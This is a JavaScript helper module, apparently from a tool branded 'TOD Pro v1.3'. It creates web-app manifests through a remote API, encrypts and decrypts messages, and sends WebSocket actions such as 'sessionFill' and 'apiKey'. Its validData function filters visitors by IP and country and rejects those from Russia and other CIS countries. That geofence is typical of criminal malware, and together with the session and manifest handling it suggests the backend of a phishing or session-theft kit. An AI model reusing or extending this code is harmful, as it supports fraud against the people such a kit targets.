const {Aes, getSHA256Hash} = require('.//aes');
const axios = require("axios");

module.exports.createManifest = async (api, manifest) => {
    for (const i in manifest) {
        manifest[i] = encodeURIComponent(manifest[i]);
    }

    const url = `https://${api}/manifest/build?name=${manifest.name}&url=${manifest.url}&icon=${manifest.icon}`;

    const response = await axios.get(url, {
        headers: {
            Authorization: manifest.apiKey
        }
    });

    return `https://${api}/manifests/${response.data.fileName}.json`;
}

class Secure {
    #s;
    #c;
    #k;
    constructor(s, c, k) {
        this.#s = s;
        this.#c = c;
        this.#k = k;
    }

    async encrypt (m, i) {
        return Aes.Ctr.encrypt(m, this.#s + await getSHA256Hash(i.toString()), 256);
    }

    async decrypt (e) {
        const data = e.split(':');
        if (typeof data !== 'object') {
            return false;
        }
        const m = Aes.Ctr.decrypt(data[0], this.#c, 256);
        const s = Aes.Ctr.decrypt(data[1], this.#k, 256);
        if (await getSHA256Hash(m) !== s) {
            return false;
        }
        return m;
    }
}

class SocketHelper {
    #socket;
    constructor(socket) {
        this.#socket = socket;
    }

    template (action, data, status)  {
        return JSON.stringify({
            action: action,
            data,
            server: 'TOD Pro v1.3'
        });
    }

    connected (s, f) {
        return this.#socket.send(JSON.stringify({
            action: 'connected',
            data: {
                key: s,
                from: f
            }
        }));
    }

    safety (m) {
        return this.#socket.send(this.template('check', m, true));
    }

    sessionFill () {
        return this.#socket.send(this.template('sessionFill', 'sessionFill', true));
    }

    w () {
        return this.#socket.send(this.template('wait', 'nothing', true));
    }

    apiKey (m) {
        return this.#socket.send(this.template('apiKey', m, true));
    }

    error () {
        return this.#socket.send(this.template('error', 'Connection closing..', false));
    }

    close () {
        return this.#socket.close();
    }

    done () {
        return this.#socket.send(this.template('done', 'task complete', true));
    }

    manifest (m) {
        return this.#socket.send(this.template('manifest', m, true));
    }

    messages (m) {
        return this.#socket.send(this.template('messages', m, true));
    }
}

function validData (d) {
    if (typeof d.ip === 'undefined' || typeof d.domain === 'undefined' || typeof d.country === 'undefined' || typeof d.sng === 'undefined') {
        return false;
    }
    if (typeof d.ip !== 'string' || typeof d.domain !== 'string' || typeof d.country !== 'string' || typeof d.sng !== 'boolean') {
        return false;
    }
    if (d.country.length !== 2) {
        return false;
    }
    if (d.sng === true && ['RU', 'KZ', 'BY', 'UA', 'AM', 'AZ', 'KG', 'MD', 'UZ', 'TJ'].includes(d.country.toUpperCase())) {
        return false;
    }
    return true;
}

module.exports.Secure = Secure;
module.exports.validData = validData;
module.exports.SocketHelper = SocketHelper;